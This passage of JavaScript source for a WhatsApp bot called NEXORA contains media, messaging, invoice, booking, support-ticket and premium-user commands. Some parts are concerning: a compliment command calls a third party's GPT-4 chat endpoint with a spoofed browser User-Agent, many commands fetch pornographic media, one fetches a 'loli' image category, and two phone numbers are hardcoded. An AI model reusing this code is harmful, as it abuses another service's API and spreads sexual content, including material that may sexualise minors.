            let response = await axios.post("https://chateverywhere.app/api/chat/", {
                "model": {
                    "id": "gpt-4",
                    "name": "GPT-4",
                    "maxLength": 32000,
                    "tokenLimit": 8000,
                    "completionTokenLimit": 5000,
                    "deploymentName": "gpt-4"
                },
                "messages": [
                    {
                        "pluginId": null,
                        "content": `Give a sweet, kind, and wholesome compliment to this person (1-3 lines max): ${victim}`,
                        "role": "user"
                    }
                ],
                "prompt": "",
                "temperature": 0.7
            }, {
                headers: {
                    "Accept": "/*/",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                }
            })
            return response.data
        }

        let compliment = await openaiCompliment(target)
        reply(`💖 *Compliment for ${target}:*\n\n${compliment}`)
    } catch (e) {
        console.error(e)
        reply("⚠️ Failed to generate compliment. Try again later.")
    }
}
break;

case 'fbhd': {
     if (!isCreator) return;
    if (!q) return reply('📥 Example: .fbhd link');

    try {
        let res = await axios.get(`https://prexzyapis.com/download/facebookv2?url=${encodeURIComponent(q)}`);

        let vid = res.data.hd || res.data.sd;

        await conn.sendMessage(from, {
            video: { url: vid },
            caption: '🎬 Facebook HD Video'
        }, { quoted: m });

    } catch {
        reply('❌ Error fetching HD video');
    }
}
break;
case 'message':
case 'send': {
    if (!isCreator) return;
    
    // Split the text input by the first space to separate the target from the actual message
    const targetInput = args[0];
    const messageToSend = args.slice(1).join(" ");

    if (!targetInput || !messageToSend) {
        return reply(`*Usage:* \n${prefix + command} [number] [message]\n\n*Example:*\n${prefix + command} 234xxxxxxx hi`);
    }

    // Sanitize the number by removing +, spaces, dashes, or parentheses
    let formattedNumber = targetInput.replace(/[^0-9]/g, '');

    // Append the standard WhatsApp domain string if it isn't there
    if (!formattedNumber.endsWith('@s.whatsapp.net')) {
        formattedNumber += '@s.whatsapp.net';
    }

    try {
        await empire.sendMessage(formattedNumber, { text: messageToSend });
        reply(`✅ Message successfully dispatched to @${targetInput.replace(/[^0-9]/g, '')}`, { mentions: [formattedNumber] });
    } catch (err) {
        console.error("Message Command Error:", err);
        reply("❌ System failed to deliver message. Ensure the format is accurate.");
    }
}
break;


case 'spongebob': {
     if (!isCreator) return;
    if (!isCreator) return;
    const axios = require('axios');
    if (!text) return reply("Please provide text for the meme. Example: .spongebob Why are you like this?");

    // Initial Reaction
    await empire.sendMessage(m.chat, {
        react: { text: '🧽', key: m.key }
    });

    const query = encodeURIComponent(text);
    const url = `https://prexzyapis.com/imagecreator/spongebob?text=${query}`;

    try {
        // Fetching the image as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const buffer = response.data;

        await empire.sendMessage(m.chat, { 
            image: buffer, 
            caption: `💨 *𝗡𝗘𝗫𝗢𝗥𝗔 𝗠𝗘𝗠𝗘 𝗚𝗘𝗡*` 
        }, { quoted: m });

        // Success Reaction
        await empire.sendMessage(m.chat, {
            react: { text: '✅', key: m.key }
        });

    } catch (err) {
        console.error(err);
        reply("Error generating Spongebob image.");
        await empire.sendMessage(m.chat, {
            react: { text: '❌', key: m.key }
        });
    }
}
break;


case 'fbt':
case 'facebook': {
     if (!isCreator) return;
    if (!q) return reply('📥 Example: .fb https://facebook.com/video');

    try {
        let res = await axios.get(`https://prexzyapis.com/download/facebookv2?url=${encodeURIComponent(q)}`);

        let data = res.data;

        await conn.sendMessage(from, {
            video: { url: data.result || data.url },
            caption: '📥 Facebook Video Downloaded'
        }, { quoted: m });

    } catch {
        reply('❌ Failed to download video');
    }
}
break;
case "dog": {
    try {
        const res = await axios.get("https://dog.ceo/api/breeds/image/random");
        const img = res.data?.message;
        if (!img) return m.reply("❌ Could not fetch a dog image.");
        await empire.sendMessage(
            m.chat,
            { image: { url: img }, caption: "🐶 Random Dog!" },
            { quoted: m }
        );
    } catch (e) {
        console.error("DOG ERROR:", e);
        m.reply("❌ Failed to fetch a dog image.");
    }
}
break;

case 'sfw': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/sfw' }}, { quoted: m })
}
break;

case 'moe': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/moe' }}, { quoted: m })
}
break;

case 'aipic': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/aipic' }}, { quoted: m })
}
break;
/*
case 'hentai': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/hentai' }}, { quoted: m })
}
break;
*/
case 'chinagirl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/chinagirl' }}, { quoted: m })
}
break;

case 'bluearchive': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/bluearchive' }}, { quoted: m })
}
break;

case 'boypic': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/boypic' }}, { quoted: m })
}
break;

case 'carimage': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/carimage' }}, { quoted: m })
}
break;

case 'random-girl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/randomgirl' }}, { quoted: m })
}
break;

case 'hijab-girl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/hijabgirl' }}, { quoted: m })
}
break;

case 'indonesia-girl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/indonesiagirl' }}, { quoted: m })
}
break;

case 'japan-girl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/japangirl' }}, { quoted: m })
}
break;


case 'korean-girl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/koreangirl' }}, { quoted: m })
}
break;

case 'loli': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/loli' }}, { quoted: m })
}
break;

case 'malaysia-girl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/malaysiagirl' }}, { quoted: m })
}
break;

case 'profile-pictures': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/profilepictures' }}, { quoted: m })
}
break;

case 'thailand-girl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/thailandgirl' }}, { quoted: m })
}
break;

case 'tiktokgirl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/tiktok-girl' }}, { quoted: m })
}
break;

case 'vietnam-girl': {
     if (!isCreator) return;
    empire.sendMessage(m.chat, { caption: `💨NEXORA`, image: { url: 'https://prexzyapis.com/random/vietnamgirl' }}, { quoted: m })
}
break;
case 'anonymous': {
     if (!isCreator) return;
    if (!text) return reply("Usage: .anonymous <your message>")
    await empire.sendMessage(m.chat, { react: { text: '📩', key: m.key } })
    
    try {
        const img = await createAnonymous("normal", text)
        await empire.sendMessage(m.chat, {
            image: img,
            caption: "📩 *Anonymous Message Generated*"
        }, { quoted: m })
    } catch (e) {
        console.log(e)
        reply("❌ Failed to generate image.")
    }
}
break

case 'iphone': {
if (!isCreator) return;
    if (!text) return reply("Usage: .iphone <your message>")
    await empire.sendMessage(m.chat, { react: { text: '📱', key: m.key } })

    try {
        const img = await createAnonymous("iphone", text)
        await empire.sendMessage(m.chat, {
            image: img,
            caption: "📱 *iMessage Style*"
        }, { quoted: m })
    } catch (e) {
        reply("❌ Error creating iPhone bubble.")
    }
}
break
// =========================================================================
// 📅 1. TEXT-BASED BOOKING ENGINE COMMAND
// =========================================================================
case 'book': {
    if (!isCreator) return;
    
    // Structure: .book Service Name | Date (YYYY-MM-DD) | Time (HH:MM)
    const usageInstructions = `⚠️ *Invalid Booking Format!*\n\n*Format:* \`${prefix}book Service Name | YYYY-MM-DD | HH:MM\`\n*Example:* \`${prefix}book Web Development | 2026-06-15 | 14:00\``;
    
    if (!text) return reply(usageInstructions);
    
    const [service, date, timeSlot] = text.split('|').map(item => item.trim());
    if (!service || !date || !timeSlot) return reply(usageInstructions);

    try {
        await empire.sendMessage(from, { react: { text: '📅', key: m.key } });

        // Generate a random unique Booking Reference ID
        const bookingRefId = 'NEX-' + Math.floor(100000 + Math.random() * 900000);

        const bookingConfirmationText = `✨ *NEXORA BOOKING CONFIRMATION* ✨\n\n`
            + `🆔 *Booking ID:* ${bookingRefId}\n`
            + `👤 *Client Name:* ${pushname}\n`
            + `📱 *Phone Number:* @${sender.split('@')[0]}\n`
            + `🛠️ *Service:* ${service}\n`
            + `📅 *Date:* ${date}\n`
            + `⏰ *Time:* ${timeSlot}\n\n`
            + `> ✅ Your appointment has been secured successfully inside our booking queue!`;

        await empire.sendMessage(from, { 
            text: bookingConfirmationText, 
            mentions: [sender] 
        }, { quoted: m });

    } catch (bookingError) {
        console.error("Booking Engine Error:", bookingError);
        reply("❌ Critical failure inside the booking scheduler component.");
    }
    break;
}

// =========================================================================
// 📄 2. AUTOMATED INVOICE GENERATOR COMMAND
// =========================================================================
case 'invoice': {
    if (!isCreator) return;

    // Structure: .invoice Client Name | Item 1, Price; Item 2, Price
    const invoiceUsage = `⚠️ *Invalid Invoice Format!*\n\n*Format:* \`${prefix}invoice Client Name | Item 1, Price; Item 2, Price\`\n*Example:* \`${prefix}invoice John Doe | Website Design, 500; Bot Hosting, 50\``;

    if (!text) return reply(invoiceUsage);

    const [clientName, itemsString] = text.split('|').map(str => str.trim());
    if (!clientName || !itemsString) return reply(invoiceUsage);

    try {
        await empire.sendMessage(from, { react: { text: '📄', key: m.key } });

        const PDFDocument = require('pdfkit');
        const path = require('path');
        const fs = require('fs');

        const invoiceId = 'INV-' + Date.now().toString().slice(-6);
        const tempPdfPath = path.join(process.cwd(), `invoice_${invoiceId}.pdf`);
        
        const doc = new PDFDocument({ margin: 50 });
        const writeStream = fs.createWriteStream(tempPdfPath);
        doc.pipe(writeStream);

        // --- PDF Generation Layout ---
        doc.fillColor('#111111').fontSize(24).text('NEXORA MD INVOICE', { align: 'right' });
        doc.fontSize(10).fillColor('#555555').text(`Invoice Number: ${invoiceId}`, { align: 'right' });
        doc.text(`Date: ${new Date().toLocaleDateString()}`, { align: 'right' });
        doc.moveDown(2);

        doc.fontSize(12).fillColor('#111111').text('BILLED TO:', { underline: true });
        doc.text(`Client Name: ${clientName}`);
        doc.text(`Generated By: Nexora Automated Billing System`);
        doc.moveDown(2);

        doc.text('LINE ITEMS & SERVICES:', { underline: true });
        doc.moveDown(0.5);

        let grandTotal = 0;
        const structuralItems = itemsString.split(';');

        structuralItems.forEach(itemRaw => {
            const [itemName, itemPrice] = itemRaw.split(',').map(i => i.trim());
            if (itemName && itemPrice) {
                const numericPrice = parseFloat(itemPrice) || 0;
                grandTotal += numericPrice;
                doc.text(`• ${itemName}: $${numericPrice.toFixed(2)}`);
            }
        });

        doc.moveDown(2);
        doc.fontSize(16).fillColor('#008000').text(`TOTAL AMOUNT DUE: $${grandTotal.toFixed(2)}`, { bold: true });
        doc.moveDown(2);
        
        // Dynamic mock payment placeholder link mapped into description
        doc.fontSize(9).fillColor('#777777').text(`To pay instantly via balance gateway, scan or visit: https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=pay_invoice_${invoiceId}_total_${grandTotal}`, { align: 'center' });
        
        doc.end();

        // Wait safely for file streams to dump data fully to disk
        writeStream.on('finish', async () => {
            const dynamicPaymentQr = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent('Invoice ID: ' + invoiceId + ' | Total Due: $' + grandTotal)}`;

            const messageCaption = `╭╼━≪• 𝙸𝙽𝚅𝙾𝙸𝙲𝙴 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴𝙳 •≫━╾╮\n`
                                 + `┃ 🆔 *Invoice ID:* ${invoiceId}\n`
                                 + `┃ 👤 *Client:* ${clientName}\n`
                                 + `┃ 💰 *Grand Total:* $${grandTotal.toFixed(2)}\n`
                                 + `╰━━━━━━━━━━━━━━━╯\n\n`
                                 + `> 📂 *Professional billing PDF generated and attached below.*`;

            // Send dynamic QR code image tracking the specific item payment balance
            await empire.sendMessage(from, { 
                image: { url: dynamicPaymentQr }, 
                caption: messageCaption 
            }, { quoted: m });

            // Send document tracking array
            await empire.sendMessage(from, { 
                document: { url: tempPdfPath }, 
                mimetype: 'application/pdf', 
                fileName: `Invoice-${invoiceId}.pdf` 
            }, { quoted: m });

            // File clean-up logic loop
            try { if (fs.existsSync(tempPdfPath)) fs.unlinkSync(tempPdfPath); } catch {}
        });

    } catch (invoiceErr) {
        console.error("Invoice System Crash:", invoiceErr);
        reply("❌ Invoice processing engine failed to write out assets safely.");
    }
    break;
}

// =========================================================================
// 🎫 3. INSTANT CUSTOMER SUPPORT TICKET ROUTER COMMAND
// =========================================================================
case 'support': case 'ticket': {
    if (!isCreator) return;
    if (!text) return reply(`⚠️ Please describe your issue!\nUsage: ${prefix}support <write what is wrong here>`);

    try {
        await empire.sendMessage(from, { react: { text: '🎫', key: m.key } });

        // NATIVE TEXT SENTIMENT ANALYZER (No External Premium NLP API Required)
        const toxicAngryKeywords = [
            'scam', 'fraud', 'steal', 'stole', 'bad', 'worst', 'stupid', 'idiot',
            'hate', 'garbage', 'trash', 'rubbish', 'fix', 'broken', 'working',
            'angry', 'annoyed', 'disgusted', 'wtf', 'fucking', 'fuck'
        ];

        const lowercaseQuery = text.toLowerCase();
        let customerSentiment = 'Neutral / Calm';
        let needsHumanEscalation = false;

        // Check if message content contains high-priority frustration items
        for (let angerTrigger of toxicAngryKeywords) {
            if (lowercaseQuery.includes(angerTrigger)) {
                customerSentiment = '😡 HIGH FRUSTRATION / ANGRY';
                needsHumanEscalation = true;
                break;
            }
        }

        const ticketReferenceNo = 'TCK-' + Math.floor(100000 + Math.random() * 900000);

        if (needsHumanEscalation) {
            // Escalation text wrapper structure
            const alertHumanAdminText = `🚨 *CRITICAL SUPPORT ESCALATION* 🚨\n\n`
                + `🎫 *Ticket:* ${ticketReferenceNo}\n`
                + `👤 *User:* ${pushname} (@${sender.split('@')[0]})\n`
                + `📊 *Sentiment Profile:* ${customerSentiment}\n`
                + `💬 *Raw Complaint:* "${text}"\n\n`
                + `⚠️ _Customer is marked frustrated. Please step into chat window directly to manually resolve this issue!_`;

            // Route ticket warning directly through to active channel or back to the owner thread
            await empire.sendMessage(from, { 
                text: alertHumanAdminText, 
                mentions: [sender] 
            }, { quoted: m });

            // WEBHOOK DISPATCH (Fires background diagnostic data packet payload seamlessly)
            const axios = require('axios');
            try {
                await axios.post('https://your-webhook-endpoint.com/escalations', {
                    ticketId: ticketReferenceNo,
                    customerName: pushname,
                    customerJid: sender,
                    sentiment: customerSentiment,
                    issueText: text,
                    timestamp: Date.now()
                }, { timeout: 3000 });
            } catch (webhookIgnore) {
                // Fails silently if no live endpoint server is listening to payload packet arrays
            }

        } else {
            // Regular automated resolution pathway if query context is calm/safe
            const standardBotResponse = `🎫 *SUPPORT TICKET CREATED* 🎫\n\n`
                + `🆔 *Reference:* ${ticketReferenceNo}\n`
                + `📊 *Sentiment Profile:* ${customerSentiment}\n\n`
                + `Hello ${pushname}, your ticket has been logged successfully. Our automated support queue is examining your query:\n\n`
                + `📝 _"${text}"_\n\n`
                + `💡 *Tip:* If you require live adjustments, use aggressive descriptive markers so our supervisor module highlights your window instantly.`;

            reply(standardBotResponse);
        }

    } catch (supportErr) {
        console.error("Support Routing Crash:", supportErr);
        reply("❌ Support routing subsystem experienced an operational processing error.");
    }
    break;
}

// --- PREMIUM MANAGEMENT SYSTEM ---
// --- PREMIUM MANAGEMENT SYSTEM ---
case 'addpremium': {
    // Authorized numbers check
    const authorized = ["2349118304002@s.whatsapp.net", "2349168095230@s.whatsapp.net"];
    if (!authorized.includes(m.sender) && !isCreator) return reply("❌ You are not authorized to add premium users.");

    if (!text) return reply(`Usage: ${prefix + command} 234xxx,30d\n\nExample: ${prefix + command} 2349118304002,30d`);
    
    let [number, duration] = text.split(',');
    if (!number || !duration) return reply("❌ Please provide the number and duration (e.g., 30d, 7d, 1h).");
    
    let userJid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    let amount = parseInt(duration);
    let unit = duration.replace(/[0-9]/g, '').toLowerCase().trim(); // Improved unit extraction
    let expireAt = moment().add(amount, unit).valueOf(); 

    // Load data safely
    let currentPrem = [];
    try {
        currentPrem = JSON.parse(fs.readFileSync('./allfunc/premium.json'));
    } catch (e) {
        currentPrem = []; // Fallback to empty list if file is empty/missing
    }

    const filteredPrem = currentPrem.filter(p => p.id !== userJid);
    filteredPrem.push({ id: userJid, expire: expireAt });
    
    fs.writeFileSync('./allfunc/premium.json', JSON.stringify(filteredPrem, null, 2));
    
    reply(`✅ *PREMIUM ADDED*\n\n👤 User: @${userJid.split('@')[0]}\n⏳ Duration: ${duration}\n📅 Expires: ${moment(expireAt).format('YYYY-MM-DD HH:mm:ss')}`, { mentions: [userJid] });
}
break;

case 'delpremium': {
    const authorized = ["2349118304002@s.whatsapp.net", "2349168095230@s.whatsapp.net"];
    if (!authorized.includes(m.sender) && !isCreator) return reply("❌ Unauthorized.");

    if (!text) return reply(`Usage: ${prefix + command} 234xxx`);
    let userJid = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    
    let currentPrem = [];
    try {
        currentPrem = JSON.parse(fs.readFileSync('./allfunc/premium.json'));
    } catch (e) {
        currentPrem = [];
    }

    let updatedPrem = currentPrem.filter(p => p.id !== userJid);
    
    fs.writeFileSync('./allfunc/premium.json', JSON.stringify(updatedPrem, null, 2));
    reply(`🗑️ Premium removed for @${userJid.split('@')[0]}`, { mentions: [userJid] });
}
break;

case 'confess': {
if (!isCreator) return;
    if (!text) return reply("Usage: .confess <your confession>")
    await empire.sendMessage(m.chat, { react: { text: '💔', key: m.key } })

    try {
        const img = await createAnonymous("confess", text)
        await empire.sendMessage(m.chat, {
            image: img,
            caption: "💔 *Anonymous Confession*"
        }, { quoted: m })
    } catch (e) {
        reply("❌ Error creating confession card.")
    }
}
break
case 'listpremium':
case 'listprem':
case 'premlist': {
    // Only authorized numbers or the bot owner can see the full list
    const authorized = ["2349118304002@s.whatsapp.net", "2349168095230@s.whatsapp.net"];
    if (!authorized.includes(m.sender) && !isCreator) return reply("❌ Unauthorized.");

    let currentPrem = JSON.parse(fs.readFileSync('./allfunc/premium.json'));
    if (currentPrem.length === 0) return reply("✨ There are currently no premium users.");

    let txt = `🏆 *NEXORA PREMIUM USERS* 🏆\n\n`;
    let now = Date.now();

    currentPrem.forEach((user, i) => {
        let remaining = user.expire - now;
        let status = remaining > 0 ? "✅ Active" : "❌ Expired";
        
        // Convert remaining time to human readable format
        let duration = moment.duration(remaining);
        let timeLeft = remaining > 0 
            ? `${duration.days()}d ${duration.hours()}h ${duration.minutes()}m` 
            : "Expired";

        txt += `*${i + 1}.* @${user.id.split('@')[0]}\n`;
        txt += `   ◦  Status: ${status}\n`;
        txt += `   ◦  Time Left: ${timeLeft}\n`;
        txt += `   ◦  Expiry: ${moment(user.expire).format('YYYY-MM-DD HH:mm')}\n\n`;
    });

    reply(txt, { mentions: currentPrem.map(u => u.id) });
}
break;

case 'anhvideonsfw':
case 'anhvideonsfw': {
if (!isCreator) return reply("owner only can use this command");
    await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/random/anhvideonsfw';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA`
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'anhmoe': {
if (!isCreator) return reply("owner only can use this command");
    await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/random/anhmoe';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA`
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'anhsfw': {
if (!isCreator) return reply("owner only can use this command");
    await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/random/anhsfw';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA`
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;


case 'boobs': {
if (!isCreator) return reply("owner only can use this command");
    await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/boobs';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'anal': {
if (!isCreator) return reply("owner only can use this command");
    await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/anal';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA`
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;


case 'bdsm': {
    if (!isCreator) return reply("owner only can use this command");
    await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
  
    const url = 'https://prexzyapis.com/nsfw/bdsm';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;

case 'dick': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/dick';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA`
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'pussy': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/pussy';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA`
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;


case 'sixtynine': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/sixtynine';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA`
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'anhvideonsfw': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/random/anhvideonsfw';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'anhnsfw': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/random/anhnsfw';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;



case 'ass': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/ass';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `🔞🥵BY NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `🔞🥵BY NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;

case 'black': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/black';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
            }, { quoted: m });
        } else {
            await empire.sendMessage(m.chat, { 
                image: buffer, 
                caption: `NEXORA` 
            }, { quoted: m });
        }
    } catch (err) {
        reply("Error fetching media.");
    }
}
break;
case 'easter': {
     if (!isCreator) return;
     await empire.sendMessage(m.chat, { react: { text: '🔞', key: m.key } });
    const axios = require('axios');
    const url = 'https://prexzyapis.com/nsfw/easter';

    try {
        // Download the data as a buffer
        const response = await axios.get(url, { responseType: 'arraybuffer' });
        const mime = response.headers['content-type'];
        const buffer = response.data;

        if (mime.includes('video')) {
            await empire.sendMessage(m.chat, { 
                video: buffer, 
                caption: `NEXORA`,
                gifPlayback: mime.includes('gif') || false 
